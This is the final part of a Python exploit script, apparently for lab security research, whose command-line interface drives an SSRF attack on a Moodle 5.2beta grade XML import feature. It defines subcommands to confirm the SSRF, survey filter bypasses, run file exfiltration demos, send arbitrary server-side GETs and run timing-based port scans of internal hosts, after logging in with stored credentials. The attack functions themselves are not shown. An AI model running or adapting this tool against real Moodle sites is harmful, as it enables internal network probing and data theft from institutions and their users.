# ─── argparse ───────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Moodle 5.2beta grade XML import SSRF exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("validate", help="prove the SSRF fires; cross-check via target logs")
    sub.add_parser("bypass-survey", help="run all helper-bypass tests, what works/doesn't")

    ex = sub.add_parser("exfil", help="exfiltration demos against the lab target")
    ex.add_argument("--paths", nargs="*", help="override the default exfil paths")
    ex.add_argument("--bounce", help="value to round-trip through /xml-leak")

    tgt = sub.add_parser("target", help="single SSRF GET to URL")
    tgt.add_argument("url")
    tgt.add_argument("--timeout", type=float, default=20.0)

    ps = sub.add_parser("portscan", help="timing-based port scan against a host")
    ps.add_argument("--host", default="ssrf1-target")
    ps.add_argument("-p", "--ports", default="80,443,22,3306,6379,8080,9200")
    ps.add_argument("--samples", type=int, default=3)
    ps.add_argument("--delay", type=float, default=0.2)
    ps.add_argument("--timeout", type=float, default=8.0)

    args = ap.parse_args()

    cfg = load_config()
    step(f"login as {cfg['user']['username']} at {cfg['base']}")
    sess = login(cfg["base"], cfg["user"]["username"], cfg["user"]["password"])
    ok(f"session ok")
    foot()

    {"validate":      cmd_validate,
     "bypass-survey": cmd_bypass_survey,
     "exfil":         cmd_exfil,
     "target":        cmd_target,
     "portscan":      cmd_portscan,
     }[args.cmd](args, sess, cfg)


if __name__ == "__main__":
    main()

```
